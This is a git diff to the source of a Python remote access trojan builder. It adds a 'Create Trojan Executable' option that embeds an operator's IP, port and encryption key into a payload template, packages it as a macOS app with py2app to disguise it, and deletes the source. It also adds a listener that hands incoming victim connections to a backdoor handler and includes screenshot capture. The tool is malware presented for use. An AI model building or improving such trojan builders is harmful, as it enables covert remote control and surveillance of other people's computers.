@@ -1,4 +1,5 @@
 import socket
+import os
 import sys
 from cryptography.fernet import Fernet
 import struct
@@ -132,7 +133,7 @@ def header():
     print(CRED + "     +#+    +#+   +#+ +#+  +#+#+# +#+              +#+    +#+            +#+        +#+     +#+ +#+         " + CEND)
     print(CRED + "#+# #+#    #+#   #+# #+#   #+#+# #+#       #+#    #+#    #+#            #+#    #+# #+#     #+# #+#          " + CEND)
     print(CRED + " #####      #######  ###    #### ########## ########     ###             ########  ###     ### ###          " + CEND)
-    print("------------------------------------------------JOn3sy_Cat v1.0----------------------------------------------------")
+    print("------------------------------------------------created by Ford Larman----------------------------------------------")
     menu()
 
 # Menu options
@@ -140,15 +141,14 @@ def menu():
     print("\n")
     print("---Menu---")
     print("1." + CYEL + " Generate Encryption Key" + CEND)
-    print("2." + CYEL + " Create Exploit" + CEND)
+    print("2." + CYEL + " Create Trojan Executable" + CEND)
     print("3." + CYEL + " Connect to Target" + CEND)
     print("type 'exit' to exit")
     select = input(">>>: ")
     if select == "3":
         find_Server()
     elif select == "2":
-        print(CRED + "[!] UNDER CONSTRUCTION" + CEND)
-        create_exploit()
+        create_rat()
     elif select == "1":
         generate_key()
     elif select == "exit":
@@ -165,10 +165,12 @@ def find_Server():
     ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     print("\n")
     print(">>> Connecting to Target")
-    print(CBLU + "[+] Server On" + CEND)
 
     '#### Enter you local IP and port ####'
-    ss.bind(('192.168.1.6', 8888))
+    ip = input("Enter IP: ")
+    port = input("Enter Port number: ")
+    ss.bind((ip, int(port)))
+    print(CBLU + "[+] Server On" + CEND)
     ss.listen(5)
     print(CBLU + "[+] LISTENING..." + CEND)
     (clientsocket, address) = ss.accept()
@@ -176,26 +178,25 @@ def find_Server():
     print(CBLU + "[+] @ " + str(address) + CEND)
     backdoor(clientsocket, ss)
 
-'current working on!'
-# Create exploit file
-def create_exploit():
+# Create rat file
+def create_rat():
     print(CBLU + "\n[+] Creating RAT Executable" + CEND)
     print("Please Enter Your designated machine details.")
     ip = input(">>> IP address: ")
     port = input(">>> Destination port : ")
     name = input("enter file name: ")
-    name = name + ".py"
+    full_name = name + ".py"
     current_key = read_key()
     code = read_code()
-    with open(name, "wb") as f:
+    with open(full_name, "wb") as f:
         f.write(code)
     # read the new file lines
-    with open(name, "r") as f:
+    with open(full_name, "r") as f:
        get_all = f.readlines()
     # write inputs to new file.
     with open(name, "w") as f:
         for i, line in enumerate(get_all, 1):
-            if i == 14:
+            if i == 15:
                 f.writelines("    key = " + str(current_key) + "\n")
             elif i == 55:
                 f.writelines("      ip =" + "'" + ip + "'" + "\n")
@@ -205,9 +206,26 @@ def create_exploit():
                 f.writelines(line)
     print(CBLU + "[+] Writing Executable..." + CEND)
     # disguise socket as executable
-
-    print("File Saved")
+    make_exec_file(name)
+    print(CBLU + "[+] Executable created" + CEND)
     menu()
+
+'convert python file to executable'
+def make_exec_file(name):
+    'take generated python file and call python3 setup py2app'
+    'write name to setup.py file'
+    with open("setup.py", "r") as f:
+       get_all = f.readlines()
+    # write inputs to new file.
+    with open("setup.py", "w") as f:
+        for i, line in enumerate(get_all, 1):
+            if i == 10:
+                f.writelines("APP = ['" + name + "']\n")
+            else:
+                f.writelines(line)
+    os.system("python3 setup.py py2app -A")
+    os.system("rm " + name + ".py")
+    return
 
 ### screen shot function ###
 # handle image as packets
